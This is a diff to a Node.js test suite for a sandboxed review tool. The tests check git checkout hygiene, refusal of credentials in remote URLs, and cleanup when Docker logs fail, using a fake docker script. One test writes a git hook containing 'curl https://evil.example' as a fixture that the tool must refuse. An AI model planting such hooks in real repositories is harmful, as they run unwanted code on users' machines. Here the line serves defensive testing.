@@ -64,6 +64,11 @@ async function fixture(t, { ledger = {}, checkoutName = "panel/review-bridge", c
     for (const key of ["user.name", "user.email"]) {
       spawnSync("git", ["-C", repo.repository, "config", "--unset", key]);
     }
+    // ...and git init's default template (hooks/*.sample, info/exclude,
+    // description), which a --template= clone does not have.
+    for (const entry of ["hooks", "info", "description"]) {
+      await fsp.rm(path.join(repo.repository, ".git", entry), { recursive: true, force: true });
+    }
     checkout = repo.repository;
     store = repo.store;
     reviewId = prepared.id;
@@ -87,7 +92,7 @@ async function fixture(t, { ledger = {}, checkoutName = "panel/review-bridge", c
     await fsp.mkdir(checkout, { recursive: true });
     // The ledger's repository_path is always a repository; the credential
     // precheck reads its configuration.
-    if (!checkoutPath) spawnSync("git", ["-C", checkout, "init", "-q"]);
+    if (!checkoutPath) spawnSync("git", ["-C", checkout, "init", "-q", "--template="]);
     await fsp.mkdir(path.join(store, "reviews", REVIEW_ID), { recursive: true });
     await fsp.writeFile(
       path.join(store, "reviews", REVIEW_ID, "review.json"),
@@ -121,7 +126,7 @@ async function fixture(t, { ledger = {}, checkoutName = "panel/review-bridge", c
 // records derived from the probe's own argument, and plays the reviewer by
 // moving the staged ledger with the server's own submit — or, when asked,
 // by also leaving the kind of trace the copy-back must refuse.
-async function fakeDocker(f, { tamper = "", directCode = "", big = false, serverError = "", present = "", imagePresent = "", baselineChildren = "", baselineHasExpected = false, leak = "", exit = "" } = {}) {
+async function fakeDocker(f, { tamper = "", directCode = "", big = false, serverError = "", present = "", imagePresent = "", baselineChildren = "", baselineHasExpected = false, leak = "", exit = "", logs = "" } = {}) {
   const bin = path.join(f.root, "bin");
   await fsp.mkdir(bin, { recursive: true });
   const runner = path.join(bin, "fake-run.mjs");
@@ -228,11 +233,16 @@ if (!args.includes("codex")) {
     path.join(bin, "docker"),
     `#!/usr/bin/env bash
 set -e
+[ -n "\${FAKE_CALLS}" ] && echo "$*" >> "\${FAKE_CALLS}"
 case "$1 $2" in
   "version --format") echo "28.3.2 linux/arm64" ;;
   "image inspect") exit 0 ;;
   "network create"|"network connect"|"network rm"|"volume rm"|"rm -f") exit 0 ;;
-  "logs "*) echo "2026-09-10T00:00:00.000Z listening 3128 allow chatgpt.com,api.openai.com"; echo "2026-09-10T00:00:01.000Z deny connect example.com:443"; echo "2026-09-10T00:00:02.000Z allow connect chatgpt.com:443" ;;
+  "logs "*) # the readiness poll (--tail 20000) sees a short log; the final collection (--tail 200000) is where the variants bite
+    case "$*" in *"--tail 200000"*) collecting=1 ;; *) collecting= ;; esac
+    if [ -n "$collecting" ] && [ -n "\${FAKE_LOGS_FAIL}" ]; then echo "Error response from daemon: log driver failed" >&2; exit 1; fi
+    echo "2026-09-10T00:00:00.000Z listening 3128 allow chatgpt.com,api.openai.com"; echo "2026-09-10T00:00:01.000Z deny connect example.com:443"
+    if [ -n "$collecting" ] && [ -n "\${FAKE_LOGS_BIG}" ]; then i=0; while [ $i -lt 30000 ]; do echo "2026-09-10T00:00:02.000Z allow connect chatgpt.com:443 filler-padding-to-exceed-the-default-buffer-xxxxxxxxxxxxxxxxxxxxxxxxxx"; i=$((i+1)); done; else echo "2026-09-10T00:00:02.000Z allow connect chatgpt.com:443"; fi ;;
   "run -d") echo 0123456789ab ;;
   "run --rm") exec "\${FAKE_NODE}" "\${FAKE_RUN}" "$@" ;;
   *) echo "fake docker: unexpected $*" >&2; exit 9 ;;
@@ -255,6 +265,9 @@ esac
     FAKE_BASELINE_HAS_EXPECTED: baselineHasExpected ? "1" : "",
     FAKE_LEAK: leak,
     FAKE_EXIT: exit,
+    FAKE_LOGS_BIG: logs === "big" ? "1" : "",
+    FAKE_LOGS_FAIL: logs === "fail" ? "1" : "",
+    FAKE_CALLS: path.join(bin, "calls.log"),
   };
 }
 
@@ -756,21 +769,36 @@ test("a checkout whose Git configuration carries a credential is refused before 
   // On a failure here, the message names the key git wrote that the
   // enumeration lacks; add it to FRESH_CLONE_CONFIG_KEYS with the platform.
   assert.equal(result.status, 0, `${result.stderr}\nclone config:\n${spawnSync("git", ["-C", panel, "config", "--local", "--list"], { encoding: "utf8" }).stdout}\n.git entries: ${(await fsp.readdir(path.join(panel, ".git"))).join(" ")}`);
-  // The .git layout is held to what a fresh clone writes: a real hook or a
-  // stray top-level entry is refused by name; the fixture's default-template
-  // hooks/*.sample and info/exclude pass.
+  // The .git layout is held to what a --template= clone writes: any file
+  // under hooks or info (a *.sample included), the default template's
+  // description, or a stray top-level entry is refused by name; empty hooks
+  // and info directories pass.
   const x = await fixture(t, { realReview: true });
-  await fsp.writeFile(path.join(x.checkout, ".git", "hooks", "pre-commit"), "#!/bin/sh\ncurl https://evil.example\n");
+  await fsp.mkdir(path.join(x.checkout, ".git", "hooks"), { recursive: true });
+  await fsp.writeFile(path.join(x.checkout, ".git", "hooks", "pre-commit.sample"), "#!/bin/sh\ncurl https://evil.example\n");
   result = launch(x, ["--review-id", x.reviewId], { PATH });
   assert.equal(result.status, 2, result.stdout);
-  assert.match(result.stderr, /\.git holds more than a fresh clone writes \(\.git\/hooks\/pre-commit\)/);
+  assert.match(result.stderr, /\.git holds more than a fresh clone writes \(\.git\/hooks\/pre-commit\.sample\)/);
   const y = await fixture(t, { realReview: true });
   await fsp.writeFile(path.join(y.checkout, ".git", "secrets"), "token\n");
   await fsp.mkdir(path.join(y.checkout, ".git", "info"), { recursive: true });
-  await fsp.writeFile(path.join(y.checkout, ".git", "info", "attributes"), "* text\n");
+  await fsp.writeFile(path.join(y.checkout, ".git", "info", "exclude"), "*.log\n");
+  await fsp.writeFile(path.join(y.checkout, ".git", "description"), "Unnamed repository\n");
   result = launch(y, ["--review-id", y.reviewId], { PATH });
   assert.equal(result.status, 2, result.stdout);
-  assert.match(result.stderr, /\.git holds more than a fresh clone writes \(\.git\/info\/attributes, \.git\/secrets\)/);
+  assert.match(result.stderr, /\.git holds more than a fresh clone writes \(\.git\/description, \.git\/info\/exclude, \.git\/secrets\)/);
+  const z = await fixture(t, { realReview: true });
+  await fsp.mkdir(path.join(z.checkout, ".git", "hooks"), { recursive: true });
+  await fsp.mkdir(path.join(z.checkout, ".git", "info"), { recursive: true });
+  result = launch(z, ["--review-id", z.reviewId, "--dry-run"]);
+  assert.equal(result.status, 0, result.stderr);
+  // A query or fragment in a remote URL is refused, whatever it carries.
+  const q = await fixture(t, { realReview: true });
+  spawnSync("git", ["-C", q.checkout, "remote", "set-url", "origin", "https://example.com/repo.git?access_token=t0k3n"]);
+  result = launch(q, ["--review-id", q.reviewId], { PATH });
+  assert.equal(result.status, 2, result.stdout);
+  assert.match(result.stderr, /holds more than a fresh clone writes \(remote\.origin\.url \(query or fragment in the URL\)\)/);
+  assert.doesNotMatch(result.stderr, /t0k3n/);
   // git itself unavailable: the check fails closed rather than passing by
   // not running.
   const j = await fixture(t, { realReview: true });
@@ -819,7 +847,7 @@ test("only a self-contained clone is accepted: a linked worktree and a shared cl
   assert.equal(result.status, 2, result.stdout);
   assert.match(result.stderr, /is not a self-contained clone: it reads objects through \.git\/objects\/info\/alternates/);
   const plain = path.join(repo.root, "plain");
-  spawnSync("git", ["clone", "-q", repo.repository, plain]);
+  spawnSync("git", ["clone", "-q", "--template=", repo.repository, plain]);
   const h = await fixture(t, { checkoutPath: plain });
   result = launch(h, ["--review-id", REVIEW_ID, "--dry-run"]);
   assert.equal(result.status, 0, result.stderr);
@@ -967,4 +995,28 @@ test("the final report arrives complete on a slowly drained stdout", async (t) =
   assert.match(out, /^residual: the one host secret inside was .*by the sidecar\n?$/m);
   const scratch = out.match(/^scratch (.+)$/m)[1];
   t.after(() => fsp.rm(scratch, { recursive: true, force: true }));
+});
+
+// The proxy log is collected bounded, and a failure to collect it neither
+// hides the report nor skips the rest of the cleanup.
+test("a huge or failing docker logs leaves the report, the criteria, and every cleanup step intact", async (t) => {
+  const f = await fixture(t, { realReview: true });
+  const env = await fakeDocker(f, { logs: "big" });
+  let result = launch(f, ["--review-id", f.reviewId], env);
+  assert.equal(result.status, 0, result.stdout.slice(-2000));
+  assert.match(result.stdout, /proxy log: allow connect chatgpt\.com:443 filler[^,]* ×30000, deny connect example\.com:443 ×1$/m);
+  assert.match(result.stdout, /criterion 3 validated verdict copied back to the host store: PASS/);
+  const g = await fixture(t, { realReview: true });
+  const env2 = await fakeDocker(g, { logs: "fail" });
+  result = launch(g, ["--review-id", g.reviewId], env2);
+  assert.equal(result.status, 0, result.stdout.slice(-2000));
+  assert.match(result.stdout, /proxy log: unavailable: Error response from daemon: log driver failed/);
+  assert.match(result.stdout, /criterion 2 host filesystem absent: PASS/);
+  assert.match(result.stdout, /criterion 3 validated verdict copied back to the host store: PASS/);
+  assert.match(result.stdout, /cleanup steps that failed: collect proxy log: Error response from daemon: log driver failed/);
+  const calls = await fsp.readFile(env2.FAKE_CALLS, "utf8");
+  for (const pattern of [/^rm -f review-bridge-advisory-\S+-codex$/m, /^rm -f review-bridge-advisory-\S+-egress$/m, /^network rm review-bridge-advisory-/m, /^run --rm --network none .*cp -a \/codex-home\/sessions/m, /^volume rm review-bridge-advisory-\S+-home$/m]) {
+    assert.match(calls, pattern);
+  }
+  assert.equal((await loadReview(g.store, g.reviewId)).status, "REVIEW_SUBMITTED");
 });
